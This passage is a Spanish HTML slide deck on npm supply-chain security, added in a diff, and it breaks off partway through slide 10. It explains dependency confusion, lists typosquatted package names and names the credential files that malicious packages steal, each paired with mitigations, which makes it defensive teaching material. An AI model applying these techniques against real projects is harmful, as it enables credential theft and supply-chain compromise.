@@ -1,0 +1,1493 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<title>Seguridad en npm · Presentación</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700&family=Geist+Mono:wght@400;500;600&display=swap">
+<script src="deck-stage.js"></script>
+<script type="application/json" id="speaker-notes">[]</script>
+<style>
+  :root{
+    --bg:        oklch(0.16 0.005 60);
+    --bg-2:      oklch(0.20 0.006 60);
+    --bg-3:      oklch(0.24 0.008 60);
+    --line:      oklch(0.34 0.008 60);
+    --line-soft: oklch(0.28 0.007 60);
+    --fg:        oklch(0.96 0.008 80);
+    --fg-2:      oklch(0.82 0.010 80);
+    --fg-3:      oklch(0.62 0.012 80);
+    --accent:    oklch(0.82 0.14 80);
+    --accent-2:  oklch(0.74 0.13 80);
+    --danger:    oklch(0.68 0.18 25);
+    --ok:        oklch(0.78 0.13 150);
+    --sans: 'Geist', ui-sans-serif, system-ui, -apple-system, Helvetica, Arial, sans-serif;
+    --mono: 'Geist Mono', ui-monospace, 'SF Mono', Menlo, Consolas, monospace;
+  }
+  html, body{ margin:0; padding:0; background:#000; color:var(--fg); font-family:var(--sans); }
+  deck-stage{ background: var(--bg); }
+  deck-stage > section{
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    font-feature-settings: "ss01", "cv11";
+    letter-spacing: -0.005em;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* ===== Frame / chrome ===== */
+  .frame{ position:absolute; inset:0; padding: 64px 88px 56px; display:flex; flex-direction:column; }
+  .frame.compact{ padding: 56px 80px 48px; }
+  .frame.dense{ padding: 48px 72px 40px; }
+  .frame.bleed{ padding:0; }
+
+  .topbar{
+    display:flex; align-items:center; justify-content:space-between;
+    font-family: var(--mono); font-size: 14px; color: var(--fg-3);
+    letter-spacing: 0.04em; text-transform: uppercase;
+  }
+  .topbar .brand{ display:flex; align-items:center; gap:14px; }
+  .topbar .brand .dot{ width:10px; height:10px; background:var(--accent); border-radius:50%; box-shadow: 0 0 0 4px color-mix(in oklab, var(--accent) 22%, transparent); }
+  .topbar .crumbs{ display:flex; gap:18px; }
+  .topbar .crumbs span:not(.active){ color: var(--fg-3); }
+  .topbar .crumbs .active{ color: var(--fg); }
+  .topbar .meta{ display:flex; gap:18px; }
+
+  .footbar{
+    margin-top:auto; display:flex; align-items:flex-end; justify-content:space-between;
+    font-family: var(--mono); font-size: 12px; color: var(--fg-3); letter-spacing:0.06em;
+    text-transform: uppercase; padding-top: 24px;
+    border-top: 1px solid var(--line-soft);
+  }
+  .footbar .pageno{ color: var(--fg); }
+
+  /* ===== Typography ===== */
+  .eyebrow{
+    font-family: var(--mono); font-size: 14px; color: var(--accent);
+    text-transform: uppercase; letter-spacing: 0.16em; font-weight: 500;
+  }
+  .h1{ font-size: 96px; line-height: 0.96; font-weight: 600; letter-spacing: -0.03em; text-wrap: balance; }
+  .h2{ font-size: 64px; line-height: 1.02; font-weight: 600; letter-spacing: -0.025em; text-wrap: balance; }
+  .h3{ font-size: 44px; line-height: 1.08; font-weight: 600; letter-spacing: -0.02em; text-wrap: balance; }
+  .h4{ font-size: 28px; line-height: 1.2; font-weight: 600; letter-spacing: -0.01em; }
+  .lead{ font-size: 28px; line-height: 1.35; color: var(--fg-2); font-weight: 400; max-width: 28ch; text-wrap: pretty; }
+  .body{ font-size: 22px; line-height: 1.5; color: var(--fg-2); text-wrap: pretty; }
+  .small{ font-size: 18px; line-height: 1.5; color: var(--fg-3); }
+  .mono{ font-family: var(--mono); }
+  .mono-tag{ font-family: var(--mono); font-size: 13px; color: var(--fg-3); letter-spacing: 0.06em; text-transform: uppercase; }
+
+  /* ===== Helpers ===== */
+  .row{ display:flex; gap: 32px; }
+  .col{ flex:1; }
+  .grid-2{ display:grid; grid-template-columns: 1fr 1fr; gap: 32px; }
+  .grid-3{ display:grid; grid-template-columns: repeat(3,1fr); gap: 24px; }
+  .grid-4{ display:grid; grid-template-columns: repeat(4,1fr); gap: 20px; }
+  .stack-12{ display:flex; flex-direction:column; gap:12px; }
+  .stack-16{ display:flex; flex-direction:column; gap:16px; }
+  .stack-24{ display:flex; flex-direction:column; gap:24px; }
+  .stack-32{ display:flex; flex-direction:column; gap:32px; }
+  .stack-48{ display:flex; flex-direction:column; gap:48px; }
+  .flex-1{ flex:1; }
+
+  /* ===== Cards & code ===== */
+  .card{
+    background: var(--bg-2);
+    border: 1px solid var(--line-soft);
+    border-radius: 14px;
+    padding: 28px 32px;
+  }
+  .card .kicker{
+    display:flex; align-items:center; gap:10px;
+    font-family: var(--mono); font-size: 13px; color: var(--fg-3);
+    text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 14px;
+  }
+  .card .kicker .num{
+    width: 26px; height: 26px; display:flex; align-items:center; justify-content:center;
+    border:1px solid var(--line); border-radius: 6px; color: var(--accent); font-weight: 500;
+  }
+
+  .term{
+    background: #0a0a0b;
+    border: 1px solid var(--line-soft);
+    border-radius: 14px;
+    overflow: hidden;
+    font-family: var(--mono);
+    font-size: 17px;
+    line-height: 1.55;
+  }
+  .term .term-bar{
+    display:flex; align-items:center; gap:8px;
+    padding: 14px 18px; border-bottom: 1px solid var(--line-soft);
+    color: var(--fg-3); font-size: 13px; letter-spacing: 0.04em;
+  }
+  .term .term-bar .lights{ display:flex; gap:6px; margin-right: 8px; }
+  .term .term-bar .lights span{ width:10px; height:10px; border-radius:50%; background: var(--bg-3); }
+  .term .term-bar .path{ margin-left: auto; color: var(--fg-3); }
+  .term pre{
+    margin:0; padding: 22px 24px; white-space: pre; overflow-x:auto;
+    color: var(--fg-2);
+  }
+  .term .c-cmt{ color: var(--fg-3); }
+  .term .c-key{ color: var(--accent); }
+  .term .c-str{ color: oklch(0.82 0.10 150); }
+  .term .c-var{ color: oklch(0.80 0.10 230); }
+  .term .c-bad{ color: var(--danger); }
+  .term .c-ok{  color: var(--ok); }
+  .term .c-mute{ color: var(--fg-3); }
+  .term .c-dim{ color: oklch(0.50 0.012 80); }
+
+  /* ===== Section divider ===== */
+  .divider{
+    position:absolute; inset:0;
+    display:grid; grid-template-columns: 0.9fr 1.1fr; align-items:stretch;
+  }
+  .divider .left{
+    background: var(--bg-2); padding: 80px;
+    display:flex; flex-direction:column; justify-content:space-between;
+    border-right: 1px solid var(--line-soft);
+  }
+  .divider .right{
+    padding: 80px;
+    display:flex; flex-direction:column; justify-content:space-between;
+  }
+  .bignum{
+    font-family: var(--mono);
+    font-size: 240px; line-height: 0.85; font-weight: 400;
+    color: var(--accent); letter-spacing: -0.04em;
+  }
+
+  /* ===== Pills & badges ===== */
+  .pill{
+    display:inline-flex; align-items:center; gap:8px;
+    padding: 8px 14px; border-radius: 999px;
+    background: var(--bg-3); border: 1px solid var(--line-soft);
+    font-family: var(--mono); font-size: 13px; color: var(--fg-2);
+    letter-spacing: 0.04em; text-transform: uppercase;
+  }
+  .pill.danger{ color: var(--danger); border-color: color-mix(in oklab, var(--danger) 40%, var(--line)); }
+  .pill.ok{ color: var(--ok); border-color: color-mix(in oklab, var(--ok) 40%, var(--line)); }
+  .pill.accent{ color: var(--accent); border-color: color-mix(in oklab, var(--accent) 40%, var(--line)); }
+
+  .tag{
+    display:inline-block; padding: 4px 10px; border-radius: 4px;
+    font-family: var(--mono); font-size: 12px; letter-spacing: 0.06em;
+    text-transform: uppercase;
+    background: color-mix(in oklab, var(--accent) 14%, transparent);
+    color: var(--accent);
+  }
+  .tag.danger{ background: color-mix(in oklab, var(--danger) 16%, transparent); color: var(--danger); }
+  .tag.ok{ background: color-mix(in oklab, var(--ok) 14%, transparent); color: var(--ok); }
+  .tag.neutral{ background: var(--bg-3); color: var(--fg-2); }
+
+  /* ===== Numbered list ===== */
+  ol.numbered{ list-style:none; padding:0; margin:0; display:flex; flex-direction:column; gap: 18px; counter-reset: i; }
+  ol.numbered li{
+    display:grid; grid-template-columns: 44px 1fr; gap: 18px; align-items:start;
+    counter-increment: i;
+    padding: 14px 0; border-top: 1px solid var(--line-soft);
+  }
+  ol.numbered li:first-child{ border-top: none; }
+  ol.numbered li::before{
+    content: counter(i,decimal-leading-zero);
+    font-family: var(--mono); color: var(--accent); font-size: 16px; padding-top: 4px;
+  }
+  ol.numbered li .t{ font-size: 22px; color: var(--fg); font-weight:500; }
+  ol.numbered li .d{ font-size: 18px; color: var(--fg-3); margin-top: 4px; }
+
+  /* ===== Title slide ===== */
+  .title-bg{
+    position:absolute; inset:0;
+    background:
+      radial-gradient(60% 80% at 85% 15%, color-mix(in oklab, var(--accent) 18%, transparent), transparent 60%),
+      radial-gradient(70% 60% at 15% 90%, color-mix(in oklab, var(--accent) 8%, transparent), transparent 60%),
+      var(--bg);
+  }
+  .grid-bg{
+    position:absolute; inset:0;
+    background-image:
+      linear-gradient(to right, color-mix(in oklab, var(--fg) 5%, transparent) 1px, transparent 1px),
+      linear-gradient(to bottom, color-mix(in oklab, var(--fg) 5%, transparent) 1px, transparent 1px);
+    background-size: 80px 80px;
+    mask-image: radial-gradient(60% 60% at 50% 50%, #000 30%, transparent 80%);
+  }
+
+  /* ===== Attack card ===== */
+  .attack-card{
+    background: var(--bg-2); border: 1px solid var(--line-soft); border-radius: 14px;
+    padding: 24px 26px; display:flex; flex-direction:column; gap: 12px;
+  }
+  .attack-card .head{ display:flex; align-items:center; justify-content:space-between; }
+  .attack-card .title{ font-size: 24px; font-weight: 600; color: var(--fg); }
+  .attack-card .desc{ font-size: 16px; line-height: 1.5; color: var(--fg-2); }
+  .attack-card .how{
+    font-family: var(--mono); font-size: 14px; line-height: 1.5; color: var(--fg-3);
+    padding: 12px 14px; background: var(--bg); border-radius: 8px; border: 1px solid var(--line-soft);
+    white-space: pre-wrap;
+  }
+
+  /* ===== Stat ===== */
+  .stat{ display:flex; flex-direction:column; gap: 8px; }
+  .stat .num{ font-family: var(--mono); font-size: 72px; line-height: 1; color: var(--accent); letter-spacing: -0.03em; font-weight: 500; }
+  .stat .lbl{ font-size: 16px; color: var(--fg-3); line-height: 1.4; }
+
+  /* ===== Timeline ===== */
+  .timeline{ display:flex; flex-direction:column; }
+  .timeline .ev{
+    display:grid; grid-template-columns: 160px 1fr; gap: 24px;
+    padding: 18px 0; border-top: 1px solid var(--line-soft);
+  }
+  .timeline .ev .when{ font-family: var(--mono); color: var(--accent); font-size: 16px; letter-spacing: 0.04em; }
+  .timeline .ev .what .name{ font-size: 22px; color: var(--fg); font-weight: 500; }
+  .timeline .ev .what .desc{ font-size: 17px; color: var(--fg-3); margin-top: 4px; line-height: 1.45; }
+
+  /* ===== Diagram pieces ===== */
+  .flow{
+    display:grid; grid-template-columns: 1fr auto 1fr auto 1fr; gap: 16px; align-items:stretch;
+  }
+  .flow .node{
+    background: var(--bg-2); border:1px solid var(--line-soft); border-radius: 12px;
+    padding: 18px 20px; display:flex; flex-direction:column; gap: 8px; min-height: 130px;
+  }
+  .flow .node .ttl{ font-family: var(--mono); color: var(--accent); font-size: 12px; letter-spacing: 0.08em; text-transform: uppercase; }
+  .flow .node .body-t{ color: var(--fg); font-size: 17px; line-height: 1.4; }
+  .flow .arrow{ align-self:center; font-family: var(--mono); color: var(--fg-3); font-size: 22px; }
+
+  /* ===== Misc ===== */
+  .kv{ display:grid; grid-template-columns: 200px 1fr; gap: 12px 24px; }
+  .kv dt{ font-family: var(--mono); color: var(--fg-3); font-size: 15px; letter-spacing: 0.04em; text-transform: uppercase; padding-top: 2px; }
+  .kv dd{ margin:0; color: var(--fg); font-size: 18px; line-height: 1.5; }
+
+  .checklist{ display:flex; flex-direction:column; gap: 10px; }
+  .checklist li{ list-style:none; display:flex; align-items:flex-start; gap: 14px; padding: 12px 0; border-top: 1px dashed var(--line-soft); }
+  .checklist li:first-child{ border-top: none; }
+  .checklist .box{
+    width:22px; height:22px; border-radius:5px; border:1px solid var(--line);
+    display:flex; align-items:center; justify-content:center; color: var(--accent);
+    font-family: var(--mono); font-size: 14px; flex-shrink:0; margin-top: 2px;
+  }
+  .checklist .txt{ font-size: 19px; color: var(--fg); line-height: 1.4; }
+  .checklist .sub{ font-size: 15px; color: var(--fg-3); margin-top: 3px; }
+</style>
+</head>
+<body>
+
+<deck-stage>
+
+<!-- ==================== 01 · TITLE ==================== -->
+<section data-screen-label="01 Portada">
+  <div class="title-bg"></div>
+  <div class="grid-bg"></div>
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec · 2026</span></div>
+      <div class="meta"><span>Presentación técnica</span><span>v1.0</span></div>
+    </div>
+
+    <div style="margin-top: 120px; max-width: 1500px;">
+      <div class="eyebrow" style="margin-bottom: 32px;">Ecosistema JavaScript · Cadena de suministro</div>
+      <h1 class="h1">Seguridad en <span style="color: var(--accent); font-family: var(--mono); font-weight: 500;">npm</span><br/>Defender el ecosistema más grande del mundo.</h1>
+      <p class="lead" style="margin-top: 40px; max-width: 44ch;">Riesgos reales, ataques recientes, configuración endurecida de <span class="mono" style="color: var(--fg);">.npmrc</span> y pipelines CI/CD a prueba de cadena de suministro.</p>
+    </div>
+
+    <div class="footbar">
+      <div>DevSecOps · Node.js · Supply Chain</div>
+      <div>01 / 27</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 02 · AGENDA ==================== -->
+<section data-screen-label="02 Agenda">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span class="active">// agenda</span></div>
+      <div class="meta"><span>02 / 27</span></div>
+    </div>
+    <div style="margin-top: 56px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">Recorrido</div>
+      <h2 class="h2" style="max-width: 22ch;">Lo que vamos a cubrir.</h2>
+    </div>
+
+    <div style="margin-top: 56px;" class="grid-2">
+      <ol class="numbered">
+        <li><div><div class="t">Introducción a npm</div><div class="d">Qué es, cómo funciona, por qué importa.</div></div></li>
+        <li><div><div class="t">Amenazas y ataques recientes</div><div class="d">Dependency confusion, typosquatting, paquetes maliciosos, supply chain.</div></div></li>
+        <li><div><div class="t">Buenas prácticas</div><div class="d">Lockfiles, auditorías, registries privados, secretos.</div></div></li>
+      </ol>
+      <ol class="numbered" style="counter-reset: i 3;">
+        <li><div><div class="t">El archivo <span class="mono">.npmrc</span></div><div class="d">Qué es, ubicaciones, prioridad y variables.</div></div></li>
+        <li><div><div class="t"><span class="mono">.npmrc</span> en CI/CD</div><div class="d">Tokens, scopes y endurecimiento de pipelines.</div></div></li>
+        <li><div><div class="t">Hoja de ruta para proyectos reales</div><div class="d">Checklist accionable + métricas.</div></div></li>
+      </ol>
+    </div>
+
+    <div class="footbar"><div>Agenda</div><div class="pageno">02 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 03 · SECTION 1 DIVIDER ==================== -->
+<section data-screen-label="03 Sección 01">
+  <div class="divider">
+    <div class="left">
+      <div class="topbar">
+        <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+        <div></div>
+      </div>
+      <div>
+        <div class="eyebrow" style="margin-bottom: 20px;">Sección</div>
+        <div class="bignum">01</div>
+      </div>
+      <div class="mono-tag">04 slides</div>
+    </div>
+    <div class="right">
+      <div></div>
+      <div>
+        <h2 class="h2">Introducción a npm</h2>
+        <p class="body" style="margin-top: 24px; max-width: 40ch;">El sistema circulatorio del JavaScript moderno: cómo funciona, por qué nos importa y qué riesgos hereda cualquier proyecto que lo use.</p>
+      </div>
+      <div class="mono-tag">Sec. 01 · Introducción</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 04 · WHAT IS NPM ==================== -->
+<section data-screen-label="04 Qué es npm">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>01 · intro</span><span class="active">// qué es</span></div>
+      <div class="meta"><span>04 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">01.1 · Definición</div>
+      <h2 class="h2" style="max-width: 22ch;">¿Qué es npm y cómo funciona?</h2>
+    </div>
+
+    <div style="margin-top: 48px;" class="grid-2">
+      <div class="stack-24">
+        <p class="body">
+          <strong style="color: var(--fg);">npm</strong> (Node Package Manager) es el gestor de paquetes por defecto de <strong style="color: var(--fg);">Node.js</strong>. Tres piezas que conviene separar mentalmente:
+        </p>
+        <ol class="numbered">
+          <li><div><div class="t">El CLI</div><div class="d"><span class="mono">npm install</span>, <span class="mono">npm run</span>, <span class="mono">npm publish</span>… la herramienta local.</div></div></li>
+          <li><div><div class="t">El registry público</div><div class="d">Índice central donde se publican y resuelven paquetes por nombre y versión.</div></div></li>
+          <li><div><div class="t">El manifiesto del proyecto</div><div class="d"><span class="mono">package.json</span> declara dependencias; <span class="mono">package-lock.json</span> congela el árbol resuelto.</div></div></li>
+        </ol>
+      </div>
+
+      <div class="stack-24">
+        <div class="term">
+          <div class="term-bar">
+            <div class="lights"><span></span><span></span><span></span></div>
+            <span>flujo de instalación</span>
+            <span class="path">~/app</span>
+          </div>
+<pre><span class="c-cmt"># 1. el CLI lee tu manifiesto</span>
+$ <span class="c-key">npm</span> install
+
+<span class="c-cmt"># 2. resuelve el árbol contra el registry</span>
+  resolving <span class="c-var">express</span>@^4.19.2 → 4.19.2
+  resolving <span class="c-var">lodash</span>@^4.17.21 → 4.17.21
+  ... <span class="c-mute">+ 312 transitive deps</span>
+
+<span class="c-cmt"># 3. descarga tarballs (.tgz) + verifica integrity</span>
+  fetch  registry.npmjs.org/express/-/express-4.19.2.tgz
+  verify sha512-<span class="c-dim">a1b2c3…</span>  <span class="c-ok">ok</span>
+
+<span class="c-cmt"># 4. ejecuta scripts del ciclo de vida</span>
+  run    <span class="c-key">preinstall</span> · <span class="c-key">install</span> · <span class="c-key">postinstall</span>
+  <span class="c-bad">⚠</span>  arbitrary code execution by design</pre>
+        </div>
+        <p class="small">El paso 4 es la grieta fundamental: instalar es ejecutar.</p>
+      </div>
+    </div>
+
+    <div class="footbar"><div>01 · Introducción / Qué es npm</div><div class="pageno">04 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 05 · WHY IT MATTERS ==================== -->
+<section data-screen-label="05 Importancia">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>01 · intro</span><span class="active">// importancia</span></div>
+      <div class="meta"><span>05 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">01.2 · Escala</div>
+      <h2 class="h2" style="max-width: 24ch;">npm es la infraestructura silenciosa del software moderno.</h2>
+    </div>
+
+    <div style="margin-top: 64px;" class="grid-4">
+      <div class="stat">
+        <div class="num">+3M</div>
+        <div class="lbl">Paquetes publicados<br/>en el registry público.</div>
+      </div>
+      <div class="stat">
+        <div class="num">~200B</div>
+        <div class="lbl">Descargas semanales<br/>a nivel global.</div>
+      </div>
+      <div class="stat">
+        <div class="num">97%</div>
+        <div class="lbl">Apps modernas con ≥ 1<br/>dependencia open source.</div>
+      </div>
+      <div class="stat">
+        <div class="num">683</div>
+        <div class="lbl">Dependencias transitivas<br/>en un proyecto React medio.</div>
+      </div>
+    </div>
+
+    <div style="margin-top: 64px;" class="card">
+      <div class="kicker"><span class="num">!</span> Implicación de seguridad</div>
+      <p class="body" style="margin:0;">Tu superficie de ataque no son tus dependencias directas — son <strong style="color:var(--fg);">todo el árbol transitivo</strong>, cada uno con sus mantenedores, credenciales, scripts de instalación y pipeline de publicación. Confías en cientos de personas que nunca conociste.</p>
+    </div>
+
+    <div class="footbar"><div>01 · Introducción / Importancia</div><div class="pageno">05 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 06 · MASS USAGE RISKS ==================== -->
+<section data-screen-label="06 Riesgos uso masivo">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>01 · intro</span><span class="active">// riesgos del uso masivo</span></div>
+      <div class="meta"><span>06 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">01.3 · Por qué duele</div>
+      <h2 class="h2" style="max-width: 24ch;">Riesgos heredados de la dependencia masiva.</h2>
+    </div>
+
+    <div style="margin-top: 48px;" class="grid-3">
+      <div class="card">
+        <div class="kicker"><span class="num">01</span> Confianza transitiva</div>
+        <p class="body" style="margin:0; font-size:19px;">Cada dependencia arrastra decenas más. Auditas una y heredas cientos sin revisar.</p>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">02</span> Ejecución en instalación</div>
+        <p class="body" style="margin:0; font-size:19px;">Los hooks <span class="mono">pre/post-install</span> ejecutan código arbitrario antes de que toques nada.</p>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">03</span> Mantenedores únicos</div>
+        <p class="body" style="margin:0; font-size:19px;">Paquetes críticos suelen depender de una sola persona — un punto único de compromiso.</p>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">04</span> Velocidad &gt; revisión</div>
+        <p class="body" style="margin:0; font-size:19px;">Publicar es trivial. Revisar antes de publicar, opcional. Tipos y firmas, raros.</p>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">05</span> Privilegios del runtime</div>
+        <p class="body" style="margin:0; font-size:19px;">Node corre con acceso a red, disco, variables de entorno, secretos del CI…</p>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">06</span> Nombres ambiguos</div>
+        <p class="body" style="margin:0; font-size:19px;">Scopes mal configurados, errores de tipeo y paquetes internos resoluble desde el registry público.</p>
+      </div>
+    </div>
+
+    <div class="footbar"><div>01 · Introducción / Riesgos</div><div class="pageno">06 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 07 · SECTION 2 DIVIDER ==================== -->
+<section data-screen-label="07 Sección 02">
+  <div class="divider">
+    <div class="left">
+      <div class="topbar"><div class="brand"><span class="dot"></span><span>pkg-sec</span></div><div></div></div>
+      <div>
+        <div class="eyebrow" style="margin-bottom: 20px;">Sección</div>
+        <div class="bignum">02</div>
+      </div>
+      <div class="mono-tag">05 slides</div>
+    </div>
+    <div class="right">
+      <div></div>
+      <div>
+        <h2 class="h2">Amenazas y ataques<br/>recientes en npm</h2>
+        <p class="body" style="margin-top: 24px; max-width: 40ch;">Los cuatro vectores que dominan los incidentes del último ciclo — cómo funcionan, qué los hace efectivos y qué impacto real han tenido.</p>
+      </div>
+      <div class="mono-tag">Sec. 02 · Amenazas</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 08 · DEPENDENCY CONFUSION ==================== -->
+<section data-screen-label="08 Dependency Confusion">
+  <div class="frame dense">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>02 · amenazas</span><span class="active">// dependency confusion</span></div>
+      <div class="meta"><span>08 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div style="display:flex; gap: 12px; margin-bottom: 18px;">
+        <span class="tag danger">Supply chain</span>
+        <span class="tag neutral">Vector: resolución de nombres</span>
+      </div>
+      <h2 class="h2" style="max-width: 22ch; font-size: 56px;">Dependency Confusion.</h2>
+      <p class="lead" style="margin-top: 14px; max-width: 50ch; font-size: 24px;">El registry público gana cuando un nombre <span class="mono" style="color:var(--fg);">interno</span> también existe en él con una versión mayor.</p>
+    </div>
+
+    <div style="margin-top: 32px;" class="grid-2">
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">!</span> Cómo funciona</div>
+          <p class="body" style="margin:0; font-size:19px;">El atacante publica en npm público un paquete con el mismo nombre que un paquete privado de la empresa (descubierto por filtración de <span class="mono">package.json</span>, repos abiertos, logs…) y le sube la versión. Si el CI no fuerza el registry privado, npm resuelve el público por ser <em>más nuevo</em>.</p>
+        </div>
+        <div class="card">
+          <div class="kicker"><span class="num">×</span> Impacto real</div>
+          <p class="body" style="margin:0; font-size:19px;">Investigación de Alex Birsan (2021) que demostró el vector contra Apple, Microsoft, PayPal, Tesla y otras 30+ empresas — RCE remoto durante el <span class="mono">npm install</span>.</p>
+        </div>
+      </div>
+
+      <div class="stack-24">
+        <div class="term">
+          <div class="term-bar">
+            <div class="lights"><span></span><span></span><span></span></div>
+            <span>resolución sin scope ni registry forzado</span>
+          </div>
+<pre><span class="c-cmt"># package.json interno</span>
+{
+  "dependencies": {
+    <span class="c-str">"acme-internal-auth"</span>: <span class="c-str">"^1.2.0"</span>
+  }
+}
+
+<span class="c-cmt"># registry público</span>
+acme-internal-auth@<span class="c-bad">99.0.0</span>  ← publicado por atacante
+
+<span class="c-cmt"># npm install resuelve…</span>
+→ public  acme-internal-auth@<span class="c-bad">99.0.0</span>  <span class="c-bad">✗</span>
+<span class="c-cmt">  (mayor versión gana, sin scope que distinga)</span></pre>
+        </div>
+
+        <div class="card">
+          <div class="kicker"><span class="num">✓</span> Mitigación</div>
+          <p class="body" style="margin:0; font-size:18px;">Usar <strong style="color:var(--fg);">scopes</strong> (<span class="mono">@acme/auth</span>) y mapearlos a un registry privado en <span class="mono">.npmrc</span>; <span class="mono">always-auth=true</span>; reservar el nombre público.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>02 · Amenazas / Dependency Confusion</div><div class="pageno">08 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 09 · TYPOSQUATTING ==================== -->
+<section data-screen-label="09 Typosquatting">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>02 · amenazas</span><span class="active">// typosquatting</span></div>
+      <div class="meta"><span>09 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div style="display:flex; gap: 12px; margin-bottom: 18px;">
+        <span class="tag danger">Ingeniería social</span>
+        <span class="tag neutral">Vector: error humano</span>
+      </div>
+      <h2 class="h2" style="max-width: 22ch; font-size: 56px;">Typosquatting.</h2>
+      <p class="lead" style="margin-top: 14px; max-width: 50ch; font-size: 24px;">Paquetes con nombres casi idénticos a los legítimos esperando un <span class="mono" style="color:var(--fg);">npm install</span> distraído.</p>
+    </div>
+
+    <div style="margin-top: 32px;" class="grid-2">
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">!</span> Cómo funciona</div>
+          <p class="body" style="margin:0; font-size:19px;">El atacante registra variantes plausibles: caracteres invertidos, sufijos comunes (<span class="mono">-js</span>, <span class="mono">2</span>), homoglifos o errores frecuentes. El payload va en <span class="mono">postinstall</span> o en el primer <span class="mono">require()</span>.</p>
+        </div>
+
+        <div class="term">
+          <div class="term-bar">
+            <div class="lights"><span></span><span></span><span></span></div>
+            <span>variantes observadas en incidentes públicos</span>
+          </div>
+<pre><span class="c-ok">cross-env</span>            <span class="c-bad">crossenv</span>         (sin guión)
+<span class="c-ok">lodash</span>               <span class="c-bad">lodahs</span>           (anagrama)
+<span class="c-ok">chalk</span>                <span class="c-bad">chаlk</span>            (с cirílica)
+<span class="c-ok">discord.js</span>           <span class="c-bad">discord-js</span>       (punto → guión)
+<span class="c-ok">eslint</span>               <span class="c-bad">eslnit</span>           (transposición)</pre>
+        </div>
+      </div>
+
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">×</span> Impacto real</div>
+          <p class="body" style="margin:0; font-size:19px;">Campañas con cientos de paquetes que roban tokens de Discord, claves de billeteras cripto, variables de entorno y archivos <span class="mono">.env</span>. Vida media muy corta — pero el daño se hace en el primer <span class="mono">install</span>.</p>
+        </div>
+        <div class="card">
+          <div class="kicker"><span class="num">✓</span> Mitigación</div>
+          <ul class="checklist">
+            <li><div class="box">✓</div><div><div class="txt">Copiar y pegar desde fuentes oficiales — no tipear nombres.</div></div></li>
+            <li><div class="box">✓</div><div><div class="txt">Revisar mantenedor, fecha de publicación y descargas antes de instalar.</div></div></li>
+            <li><div class="box">✓</div><div><div class="txt">Bloquear <span class="mono">scripts</span> en CI con <span class="mono">--ignore-scripts</span>.</div></div></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>02 · Amenazas / Typosquatting</div><div class="pageno">09 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 10 · MALICIOUS PACKAGES ==================== -->
+<section data-screen-label="10 Malicious Packages">
+  <div class="frame dense">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>02 · amenazas</span><span class="active">// malicious packages</span></div>
+      <div class="meta"><span>10 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div style="display:flex; gap: 12px; margin-bottom: 18px;">
+        <span class="tag danger">Payload directo</span>
+        <span class="tag neutral">Vector: paquete diseñado para hacer daño</span>
+      </div>
+      <h2 class="h2" style="max-width: 22ch; font-size: 56px;">Paquetes maliciosos.</h2>
+      <p class="lead" style="margin-top: 14px; max-width: 50ch; font-size: 24px;">Código publicado con intención hostil desde el primer commit. Versión nueva, repositorio fresco, identidad sintética.</p>
+    </div>
+
+    <div style="margin-top: 28px;" class="grid-2">
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">!</span> Patrones más comunes</div>
+          <ul class="checklist">
+            <li><div class="box">▸</div><div><div class="txt">Robo de credenciales y secretos</div><div class="sub">Lectura de <span class="mono">~/.aws</span>, <span class="mono">~/.ssh</span>, <span class="mono">.env</span>, tokens del CI.</div></div></li>
